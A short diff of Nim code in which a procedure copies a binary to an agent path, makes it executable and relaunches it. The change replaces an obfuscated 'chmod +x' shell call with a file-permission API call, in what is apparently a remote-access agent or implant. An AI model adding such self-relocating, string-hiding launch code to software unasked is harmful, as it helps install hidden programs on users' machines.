@@ -156,7 +156,7 @@ proc linux_start*(): void =
         var agent_execution_dir = splitFile(agent_execution_path_linux)[0]
         createDir(agent_execution_dir)
         copyFile(binary_path, agent_execution_path_linux)
-        discard execCmdEx(protectString("chmod +x ") & agent_execution_path_linux)
+        setFilePermissions(agent_execution_path_linux, {fpUserExec})
         discard startProcess(agent_execution_path_linux, options={})
         quit()
     else:
